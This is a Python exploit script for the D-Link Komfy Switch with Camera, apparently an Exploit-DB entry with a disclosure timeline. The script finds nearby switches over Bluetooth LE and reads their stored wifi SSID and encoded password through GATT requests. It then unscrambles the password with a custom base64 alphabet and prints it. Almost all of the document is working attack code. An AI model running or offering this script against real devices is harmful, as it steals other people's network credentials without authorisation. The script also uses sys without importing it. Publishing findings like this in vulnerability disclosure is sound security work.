#!/usr/bin/python
# Exploit Title: Komfy Switch with Camera Wifi Password Disclosure via Bluetooth BLE
# Date: Oct 13, 2016
# Exploit Author: Jason Doyle @_jasondoyle
# Vendor Homepage: http://us.dlink.com/products/connected-home/komfy-switch-with-camera/
# HW Model: DKZ-201S/W
# SW Version: 1.0
# Tested on: Ubuntu 16.04 LTS / Python 2.7
# Disclosure Timeline: 10/11/16 Reported vulnerability to D-Link
#                      10/11/16 D-Link responded - The Komfy switch will be discontinued 12/30/16. No fix planned.

# Vulnerability Summary
#It is possible for an unauthenticated, remote attacker to retrieve the Komfy device's associated wifi ssid and password over bluetooth (4.0/BLE).

# Vulnerability Details
#https://github.com/jasondoyle/Komfy-Switch-Wifi-Password-Disclosure  



# Author: Jason Doyle @_jasondoyle
# Komfy Switch with Camera wifi password disclosure exploit script
import re, base64
from bluepy.btle import Scanner
from gattlib import GATTRequester

#lookup table to unscramble
base64Alphabet =  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" # '=' used for padding
komfy64Alphabet = "qazwersdfxcvbgtyhnmjklpoiu5647382910+/POIKLMJUYTGHNBVFREWSDCXZAQ$" # '$' used for padding

scanner = Scanner()

devices = scanner.scan(5.0)
bAddr = ""
for dev in devices:
    if "6c:72:20" in dev.addr and dev.getValueText(1) and dev.getValueText(7) and dev.getValueText(9):
        bAddr = dev.addr
        print "[+] Komfy switch found: %s (%s), RSSI=%d dB" % (dev.addr, dev.addrType, dev.rssi)
if not bAddr:
    print "No Komfy switches found"
    sys.exit(1)

req = GATTRequester(bAddr.encode('ascii','ignore'), False, 'hci0')
req.connect(True, 'public', 'none', 0, 78)

#request SSID
wifiSsid = req.read_by_uuid("0xb006")[0]
reg = re.search(r"(:\s\"(.*)\")", wifiSsid)
wifiSsid = reg.groups()[1].replace("\\","")

#request komfy encoded wifi password
wifiPassKomfy64 = req.read_by_uuid("0xb007")[0]
reg = re.search(r"(:\s\"(.*)\")", wifiPassKomfy64)
wifiPassKomfy64 = reg.groups()[1].replace("\\","")

#convert password to real base64
wifiPassBase64 = ""
for char in wifiPassKomfy64:
    i = komfy64Alphabet.index(char)
    wifiPassBase64 += base64Alphabet[i]

wifiPass = base64.b64decode(wifiPassBase64)
print "[+] Wifi password found for Komfy Switch [%s] SSID: %s Password: %s" % (bAddr, wifiSsid, wifiPass)